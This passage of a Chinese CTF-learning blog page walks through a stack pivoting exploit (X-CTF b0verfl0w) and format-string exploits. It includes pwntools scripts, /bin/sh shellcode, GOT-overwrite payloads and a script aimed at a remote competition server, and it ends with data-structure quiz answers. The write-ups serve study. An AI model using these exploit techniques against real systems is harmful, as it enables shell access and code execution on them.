-<h1 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h1><h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><p>首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控制的内存，bss段、heap等等），然后在这个位置再进行rop。ctf wiki上为我们总结了几种有可能使用到该技巧的情况：</p>
-<ul>
-<li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li>
-<li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
-<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li>
-</ul>
-<p>当然这个用起来还有一些限制条件，最关键的就是你要能控制栈指针</p>
-<h2 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016 - b0verfl0w"></a>X-CTF Quals 2016 - b0verfl0w</h2><p>原理看完了就拿题目来练练手吧。题目在ctf wiki的github上可以找到。老规矩先拿ida瞅一眼（保护机制检查不说了，这题啥也没有）<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxfx5dn01xj30h60aq40e.jpg" alt=""><br>可以看到vul函数很明显有栈溢出漏洞，而且还意外发现有个hint的函数，不得不说出题人挺友好的<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxfx6ydfrjj30h603cwf4.jpg" alt=""><br>可以看到hint函数其实就一句sub esp,0x24 ，估计大家也都会想到了，题目的解决思路应该和这有关。</p>
-<p>很明显是栈溢出，因为没有保护，那我们就考虑能不能直接写入shellcode执行，答案是不行，没有合适的地方让我们存储。题目中没有存储的数组，而溢出后只有14个可用字节，所以shellcode是肯定没有办法按照之前的技巧放入的。这时候就需要用到我们的stack poviting技术了</p>
-<p>因为提示很明显了，让esp减掉了0x24，那我们可以想到，我们完全可以在栈上布置shellcode（没有开启DEP），填充完后让esp减掉某个值，再跳转到对应位置，那我们的shellcode不就被执行了吗。</p>
-<p>说干就干，首先要找到能够让我们劫持栈指针的godget，拿ROPgadget查一下<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxfxlb23qgj30zu06i76o.jpg" alt=""><br>可以看到有jmp esp这个指令，那我们就可以开始我们的exp构造工作了</p>
-<pre><code>from pwn import *
-p = process(&apos;./b0verfl0w.dms&apos;)
-jmp_esp = 0x08048504
-shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
-shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
-shellcode += &quot;\x0b\xcd\x80&quot;
-sub_jmp = asm(&apos;sub esp,0x28;jmp esp&apos;)
-payload = shellcode.ljust(0x20,&apos;a&apos;) + &apos;aaaa&apos; +p32(jmp_esp) + sub_jmp
-#payload = shellcode + (0x20 - len(shellcode))*&apos;a&apos; + &apos;aaaa&apos; + p32(jmp_esp) + sub_jmp
-p.sendline(payload)
-p.interactive()
-</code></pre><p>为什么是-0x28呢？实际上是pad + ebp + retaddr算出来的，pad是0x20，四位的ebp，四位的retaddr，自然是0x28了，当然你也可以用别的，不过那就需要你自己改一下shellcode的布置了。</p>
-<p>successful</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/20/pwn学习（5）格式化字符串漏洞2/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/20/pwn学习（5）格式化字符串漏洞2/" itemprop="url">pwn学习（5）格式化字符串漏洞2</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-20T19:36:28+08:00">
-                2018-11-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>昨天看了看格式化字符串漏洞的一些基本内容，今天一方面补全了一下知识，另一方面也做了个题目来练手。</p>
-<h2 id="覆盖任意地址"><a href="#覆盖任意地址" class="headerlink" title="覆盖任意地址"></a>覆盖任意地址</h2><p>首先来看看昨天没有搞完的覆盖内存，昨天我们成功覆盖了栈上的内存改变了局部变量c的值，让程序执行到了我们想要的结果，那程序中还有两个变量a、b（a、b为初始化的全局变量，存储在data段，并不在栈上，详情请看上一篇），能不能将他们的值也改变呢？</p>
-<p>当然可以了，这就是我们内存覆盖的第二个方面—任意地址内存覆盖</p>
-<h3 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h3><p>我们分析程序认识到，我要想输出想要的结果，我们需要把a的值设置为2，b的值设置为0x12345678，那么问题就来了，我们上一次提到的%n是将“打印的个数”写入某个地址，一般的格式是</p>
-<pre><code>addr + %n$n 
-</code></pre><p>而addr作为一个地址长度已经是4了，难道说我们覆盖的最小值只能是4？那当然不是了，我们可以构造下面形式的payload：</p>
-<pre><code>aa%k$nxx + addr
-</code></pre><p>是不是和刚才的有些不一样？这有什么玄机呢？其实很简单，我们之前构造payload时，是找到了我们输入的第一个四个字节所在的栈上的位置进而写入，那么我们也完全可以找到我们输入的第二个四个字节所在的位置（这个位置一想就知道了，就是我们之前找的那个偏移再+1）写入，以此类推。</p>
-<p>上面的字符串其实首先拿aa作为填充字符，和%k凑了四个字节，然后拿$n和xx凑了四个字节，最后的是addr，那addr在栈上的位置也就是原来的偏移6  + 2 也就是8，所以我们的k就是8。万事具备，那我们就上脚本了：</p>
-<pre><code>p = process(&apos;./overwrite.dms&apos;)
-a_addr = 0x804A024
-payload = &apos;aa%8$naa&apos; + p32(a_addr)
-p.sendline(payload)
-print p.recv()
-p.interactive()
-</code></pre><h3 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h3><p>具体原理就不再博客上放了（我也没信心说明白，可以参考ctf wiki，毕竟咱们不能做脚本小子），给一个pwntools给出的函数来一步实现</p>
-<pre><code>payload = fmtstr_payload(offset, {addr:data})
-</code></pre><p>这里的offset也就是咱们求出来的偏移值，addr是你想写入的地址，而data是你想写入的数据。<br>这样我们也可以很轻松的覆盖掉b的值，使程序执行到我们想要的地方，脚本如下</p>
-<pre><code>p = process(&apos;./overwrite.dms&apos;)
-b_addr = 0x804A028
-payload = fmtstr_payload(6, {b_addr:0x12345678})
-p.sendline(payload)
-#print p.recv()
-p.interactive()
-</code></pre><h2 id="自动化寻找偏移值"><a href="#自动化寻找偏移值" class="headerlink" title="自动化寻找偏移值"></a>自动化寻找偏移值</h2><p>Pwntools中同样给出了自动化寻找偏移值的方法，不过还是要在重复一遍，还是要搞明白之前讲的原理，毕竟咱们的目的不是做个脚本小子</p>
-<pre><code>def getoffset(payload):
-    p = process(&quot;./overwrite.dms&quot;)
-    p.sendline(payload)
-    info = p.recv()
-    p.close()
-    return info
-autofmt = FmtStr(getoffset)
-print autofmt.offset
-</code></pre><h2 id="题目实战1"><a href="#题目实战1" class="headerlink" title="题目实战1"></a>题目实战1</h2><p>题目是来自iscc2017的第一道pwn题，链接就不放了，很容易找到，还是老规矩，首先拿ida分析一波</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxeuemhwz8j30om0g8tb6.jpg" alt=""></p>
-<p>可以看到在我们输入name后有一个很明显的格式化字符串漏洞。而在程序中没有可以供我们利用的/bin/sh字符串和system函数，那我们就要考虑人为的创造他们了。</p>
-<p>/bin/sh字符串好说，因为程序存在输入，我们完全可以直接写进去，但system函数怎么办呢？前面说了利用这个漏洞我们可以实现任意地址的泄漏和写入，那我们可以首先泄漏某个函数的libc地址，然后计算出system的地址写入（因为got表表是可写的）之前的那个函数，这就相当于把之前的函数“变成”了system，拿选谁比较合适呢？当然是printf了，因为printf的参数恰好就是我们输入的字符，那我们把printf代替之后就可以直接执行system(“/bin/sh”)了</p>
-<p>思路有了，上exp！</p>
-<pre><code>from pwn import *
-#context.log_level = &apos;debug&apos;
-
-libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
-elf = ELF(&quot;./pwn1&quot;)
-got_printf = elf.got[&apos;printf&apos;]
-p = process(&quot;./pwn1&quot;)
-p.recvuntil(&quot;input$&quot;)
-p.sendline(&apos;1&apos;)
-p.recvuntil(&apos;please input your name:\n&apos;)
-payload = p32(got_printf) + &quot;%6$s&quot;
-p.sendline(payload)
-printf_addr_and_xxx = p.recvuntil(&quot;,you&quot;)
-printf_addr = u32(printf_addr_and_xxx[4:8])
-print &quot;printf_addr = &quot; + hex(printf_addr)
-system_addr = printf_addr - (libc.symbols[&apos;printf&apos;] - libc.symbols[&apos;system&apos;])
-print &quot;system_addr = &quot; + hex(system_addr)
-
-p.recvuntil(&quot;input$&quot;)
-p.sendline(&apos;1&apos;)
-p.recvuntil(&apos;please input your name:\n&apos;)
-
-payload2 = fmtstr_payload(6, {got_printf: system_addr})
-p.sendline(payload2)
-
-p.sendline(&apos;1&apos;)
-p.recvuntil(&apos;please input your name:\n&apos;)
-p.sendline(&apos;/bin/sh\0&apos;)
-
-p.interactive()
-</code></pre><h2 id="题目实战2"><a href="#题目实战2" class="headerlink" title="题目实战2"></a>题目实战2</h2><p>第二个例题是2018山东省赛的pwn的铜牌题目，题目在学校的平台上有，难度不是很大，首先还是ida看一下</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxexaabnswj30wm0ekq5s.jpg" alt=""></p>
-<p>可以看到很明显是格式化字符串漏洞，再看一下题目还给个getFlag函数能直接显示flag，不过想要执行这个函数还需要number等于0x2018</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxexeowvb4j30cy06m74u.jpg" alt=""></p>
-<p>那思路就有了，我们可以首先改写计数器total count来多次执行这个漏洞，紧接着再利用任意地址覆盖使得number变为0x2018</p>
-<p>最后我们找个getFlag函数的“替身”，这里我们可以看到选择</p>
-<p>当然在做这些之前还是需要找到偏移的，可以手动也可以直接用之前自动化的脚本，最后的exp如下：</p>
-<pre><code>from pwn import *
-p = remote(&quot;47.105.148.65&quot;,9999)
-count_addr = 0x804A064
-num_addr = 0x804A060
-put_addr = 0x804A01C
-flag_addr = 0x8048616
-payload = fmtstr_payload(4,{count_addr:0x3})
-p.sendline(payload)
-payload = fmtstr_payload(4,{num_addr:0x2018})
-p.sendline(payload)
-payload = fmtstr_payload(4,{put_addr:flag_addr})
-p.sendline(payload)
-p.interactive()
-</code></pre><p>successful</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/pwn学习（4）初识格式化字符串漏洞/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/19/pwn学习（4）初识格式化字符串漏洞/" itemprop="url">pwn学习（4）初识格式化字符串漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-19T19:44:06+08:00">
-                2018-11-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="什么是格式化字符串？"><a href="#什么是格式化字符串？" class="headerlink" title="什么是格式化字符串？"></a>什么是格式化字符串？</h1><p>这个问题我相信学过c语言的都不陌生，我们在使用printf一类（比如：sprintf、fprintf等）的函数时经常会用到这个东西，他的样子很好识别，一般就是%后面跟着一些字符，比如下面我们printf函数的第一个参数</p>
-<pre><code>#include&lt;stdio.h&gt;
-int main()
-{
-    printf(&quot;this is a format string %s&quot; , &quot;yes&quot;);
-    return 0;
-}
-</code></pre><p>它主要是用一个说明符（在上面的例子中是s）来告诉程序该以何种格式来输出，而后为我们在输出中按格式填充入我们在后面的内容</p>
-<p>下面是几个常见的说明符</p>
-<pre><code>%d - 十进制 - 输出十进制整数
-%s - 字符串 - 从内存中读取字符串
-%x - 十六进制 - 输出十六进制数
-%c - 字符 - 输出字符
-%p - 指针 - 指针地址
-%n - 到目前为止所写的字符数
-</code></pre><p>这里前几个都是用来打印的，最后一个却是一个“异类”，这家伙的作用是写入到某个内存区域到现在为止写过的字符个数。注意要和%n$n区别开来，这个的作用是“选择”，举个例子讲，%3$s，这个的意思就是将第三个我们的填充物以%s的格式打印出来。<br>因为这些说明符的种种特性，我们可以使用它们来干一些“坏事”</p>
-<h1 id="漏洞在哪？"><a href="#漏洞在哪？" class="headerlink" title="漏洞在哪？"></a>漏洞在哪？</h1><p>如果我想让你写一段代码打印出我输入的字符串你会怎么办？我相信大多数人会写出下面的代码：</p>
-<pre><code>char str[100]
-scanf(&quot;%s&quot;,str)
-printf(&quot;%s&quot;,str)
-</code></pre><p>代码看上去很简单嘛，但总有人喜欢偷懒，他会写成如下的形式：</p>
-<pre><code>printf(str)
-</code></pre><p>这就出问题了，一般的函数，传入的参数都是固定的，但printf却不同，因为它要求有一个format string，这个format string就是它的身家性命，这东西就决定了它后面有多少的参数，而就算是你的format string后面没有足够的参数，他也会认为“你有足够的参数”，然后自动读取栈上的数据，按照你的format打印出来。那我们就可以玩点有趣的东西了，我们先给出个程序（程序代码来自ctf wiki）</p>
-<pre><code>#include &lt;stdio.h&gt;
-int main() {
-  char s[100];
-  int a = 1, b = 0x22222222, c = -1;
-  scanf(&quot;%s&quot;, s);
-  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);
-  printf(s);
-  return 0;
-}
-</code></pre><p>可以看到这个程序就存在格式化字符串的漏洞。程序逻辑很简单，在我们输入s后，它先是“安全”的打印了s的内容，然后又直接打印了s，我们是这运行时输入这样一段数据</p>
-<pre><code>AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
-</code></pre><p>然后我们就非（li）常（suo）惊（ying）讶（dang）的发现程序给我们输出这些内容：</p>
-<pre><code>00000001.22222222.ffffffff.AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
-AAAAffff5160,c2,f7e036bb,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825
-</code></pre><p>很显然程序把原本不用该暴露给我们的东西都吐了出来，而输出的第四部分41414141大家也应该很清楚，就是我们的AAAA</p>
-<h1 id="泄漏任意内存地址"><a href="#泄漏任意内存地址" class="headerlink" title="泄漏任意内存地址"></a>泄漏任意内存地址</h1><p>通过前几次的学习我们知道了got表可是个好东西，当时我们想法设法的泄漏出got表内容进而拿到libc里面所有我们想要的东西。而通过这个漏洞我们可以非常轻松的实现got表的泄漏</p>
-<p>还是以上面的程序为例，程序中存在scanf函数，那我们就泄漏这个函数的got表地址。</p>
-<p>首先先看一下我们上面的测试，刚才的测试可不是仅仅为了演示漏洞，我们还可以看见程序给我们的的输出中41414141和我们的输入“AAAA”实际上是一样的，而41414141也就是第五个打印的部分，那也就是说，前面的我们实际上都不需要，我们借助上面调皮的%n就可以完美实现打印这个东西了。</p>
-<p>话不多说，上脚本</p>
-<pre><code>from pwn import *
-sh = process(&apos;./leakmemory&apos;)
-leakmemory = ELF(&apos;./leakmemory&apos;)
-__isoc99_scanf_got = leakmemory.got[&apos;__isoc99_scanf&apos;]
-print hex(__isoc99_scanf_got)
-payload = p32(__isoc99_scanf_got) + &apos;%4$s&apos;
-print payload
-gdb.attach(sh)
-sh.sendline(payload)
-sh.recvuntil(&apos;%4$s\n&apos;)
-print hex(u32(sh.recv()[4:8])) 
-sh.interactive()
-
-0x804a014
-\x14\xa0\x0%4$s
-[*] running in new terminal: /usr/bin/gdb -q  &quot;./leakmemory.dms&quot; 8086 -x &quot;/tmp/pwn2rdIM1.gdb&quot;
-[+] Waiting for debugger: Done
-0xf7de20c0
-[*] Switching to interactive mode
-</code></pre><p>成功拿到了scanf在got表中的地址</p>
-<h1 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h1><p>那有了泄漏任意地址的方式，那我们有没有利用这个来实现覆盖地址呢？其实是可以的，这里我们要用到关于%n的知识，其实上面说过了，但还是再列一遍</p>
-<p><strong>%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</strong></p>
-<p>这里应该分两部分，但今天有点事耽搁了，所以就先简单的看看第一部分，栈上的内存覆盖吧，程序如下（依旧来自ctf wiki）</p>
-<pre><code>/* example/overflow/overflow.c */
-#include &lt;stdio.h&gt;
-int a = 123, b = 456;
-int main() {
-  int c = 789;
-  char s[100];
-  printf(&quot;%p\n&quot;, &amp;c);
-  scanf(&quot;%s&quot;, s);
-  printf(s);
-  if (c == 16) {
-    puts(&quot;modified c.&quot;);
-  } else if (a == 2) {
-    puts(&quot;modified a for a small number.&quot;);
-  } else if (b == 0x12345678) {
-    puts(&quot;modified b for a big number!&quot;);
-  }
-  return 0;
-}
-</code></pre><p>简单看看，程序会输出变量c的地址，然后有个格式化字符串的漏洞，本来if判断c是不成立的，那我们就利用这个漏洞来改变c的值来让它符合。</p>
-<p>首先还是用我们刚才的泄漏栈变量的方式（也就是上面的方法）确定偏移</p>
-<pre><code>0xfff5de4c
-AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
-AAAAfff5dde8,c2,f7e7a6bb,fff5de0e,fff5df0c,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78
-</code></pre><p>可以看到偏移是6，那我们就知道了payload最后应该是%6$n，我们的目标是让c变成16，我们一开始输入的是拿p32()处理过的c的地址，只有4位，还缺12位，我们就补个%012d，让程序随便打12个数据就好了，分析完毕，上脚本！</p>
-<pre><code>from pwn import *
-sh = process(&apos;./overwrite.dms&apos;)
-c_addr = int(sh.recvuntil(&apos;\n&apos;, drop=True), 16)
-print hex(c_addr)
-payload = p32(c_addr) + &apos;%012d&apos; + &apos;%6$n&apos;
-print payload
-#gdb.attach(sh)
-sh.sendline(payload)
-print sh.recv()
-sh.interactive()
-</code></pre><p>successful！</p>
-<p>那今天就先到这里了～明天估计会有格式化字符串的第二篇，以及栈溢出的更多的玩法，具体还是要看我的学习进度了</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/数据结构基础-顺序表/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/19/数据结构基础-顺序表/" itemprop="url">数据结构基础--顺序表</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-19T19:30:37+08:00">
-                2018-11-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/数据结构/" itemprop="url" rel="index">
-                    <span itemprop="name">数据结构</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><strong>对于顺序存储的长度为N的线性表，访问结点和增加结点的时间复杂度分别对应为O(1)和O(N)。</strong></p>
-<p>答案为<em>T</em>，顺序存储的线性表可以利用偏移轻松拿到每一个元素，但是如果要增加一个元素的话则需要把之后的所有的元素都后移一位。</p>
-<p><strong>若某线性表最常用的操作是存取任一指定序号的元素和在最后进行插入和删除运算，则利用顺序表存储最节省时间。</strong></p>
-<p>答案为<em>T</em>，因为比起链表形式找一个元素需要遍历，顺序表直接用偏移就ok了，而且如果只是在最后进行插入删除的话也无需移动大量元素</p>
-<p><strong>对于顺序存储的长度为N的线性表，删除第一个元素和插入最后一个元素的时间复杂度分别对应为O(1)和O(N)。</strong></p>
-<p>答案为<em>F</em>，删除第一个元素需要把之后所有的元素依次提前一个，所以应该为N，而插入最后一个元素直接在最后插入即可</p>
-<p><strong>(neuDS)在顺序表中逻辑上相邻的元素，其对应的物理位置也是相邻的。</strong></p>
-<p>答案为<em>T</em>，线性表是随机存储的，所以物理位置是相邻的</p>
-<p><strong>(neuDS)所谓随机存取，就是通过首地址和元素的位序号值可以在O(1)的时间内找到指定的元素。</strong></p>
-<p>答案为<em>T</em>，这个在之前的链表选择判断里说过了</p>
-<p><strong>(neuDS)顺序存储的线性表不支持随机存取。</strong></p>
-<p>答案为<em>F</em>，和上边的那个一样</p>
-<p><strong>(neuDS)在顺序表上进行插入、删除操作时需要移动元素的个数与待插入或待删除元素的位置无关。</strong></p>
-<p>答案为<em>F</em>，显然是错误的，因为你每次的插入删除操作都是要移动后面所有的元素的</p>
-<p><strong>对于顺序存储的长度为N的线性表，访问结点和增加结点的时间复杂度为：</strong></p>
-<p>答案为<em>O(1), O(N)</em>，访问结点直接用偏移，而增加结点需要把这个元素后面的所有元素都移动。</p>
-<p><strong>在N个结点的顺序表中，算法的时间复杂度为O(1)的操作是：</strong></p>
-<p>答案为<em>访问第i个结点（1≤i≤N）和求第i个结点的直接前驱（2≤i≤N）</em>，随机存储不再说了</p>
-<p><strong>若某线性表最常用的操作是存取任一指定序号的元素和在最后进行插入和删除运算，则利用哪种存储方式最节省时间？</strong></p>
-<p>答案为<em>顺序表</em>，参考上面，懒得再说了</p>
-<p><strong>顺序表中第一个元素的存储地址是100，每个元素的长度为2，则第5个元素的地址是（ ）。</strong></p>
-<p>答案为<em>108</em>，100是第一个元素的，第二个是102，依次类推，逆向的应该都懂</p>
-<p><strong>(neuDS)线性表的顺序存储结构是一种( ) </strong></p>
-<p>答案为<em>随机存取的存储结构</em>，懒得说了</p>
-<p><strong>(neuDS)一个顺序表所占用的存储空间大小与( )无关。</strong></p>
-<p>答案为<em>元素的存放顺序</em>，其实主要取决于元素的多少和元素的类型（包括元素所含有的子元素的类型）</p>
-<p><strong>(neuDS)要将一个顺序表{a0,a1,……,an−1}中第i个数据元素ai(0≤i≤n-1)删除，需要移动（ ）个数据元素。</strong></p>
-<p>答案为<em>n-i-1 </em>，因为要删除第i个，所以它后面的元素你都要向前移动一个，而由于顺序表是0开始的，最后一个元素是n-1，所以也就是n-1-i，也就是答案了</p>
-<p><strong>若长度为n的线性表采用顺序存储结构，那么删除它的第i个数据元素之前，需要它一次向前移动（）个数据元素。</strong></p>
-<p>答案为<em>n-i </em>和上面的一样</p>
-<p><strong>若长度为n的线性表采用顺序结构，在第i个数据元素之前插入一个元素，需要它依次向后移动（）个元素</strong></p>
-<p>答案为<em>n-i+1</em>，要注意插入和删除的区别，因为删除时，你移动的只是原来位置元素的后面的元素，而插入的话除了原来元素的后面的元素，还要多移动一个原来的元素，所以也就是要+1了</p>
-<p><strong>线性表L=（a1, a2 ,……，an ）用一维数组表示，假定删除线性表中任一元素的概率相同（都为1/n），则删除一个元素平均需要移动元素的个数是（）。</strong></p>
-<p>答案为<em>(n-1)/2 </em>，其实这个问题和1+2+3+…+9有点像，因为第n个和倒数第n个总能凑成一对，然后除2就完了，当然你要是想不通的话也可以用等差数列做…</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/数据结构基础-链表/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/18/数据结构基础-链表/" itemprop="url">数据结构基础--链表</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T20:32:37+08:00">
-                2018-11-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/数据结构/" itemprop="url" rel="index">
-                    <span itemprop="name">数据结构</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><strong>在具有N个结点的单链表中，访问结点和增加结点的时间复杂度分别对应为O(1)和O(N)。 (1分)</strong></p>
-<p>答案应为<em>F</em>，单链表访问结点因为只能够一个一个的看，所以并不能像数组存储那样时间复杂度那么低，它的时间复杂度应该为 <em>o(n)</em>，实际上，<em>单链表的几个常见操作时间复杂度都是o(n)的</em></p>
-<p><strong>若用链表来表示一个线性表，则表中元素的地址一定是连续的。 (1分)</strong></p>
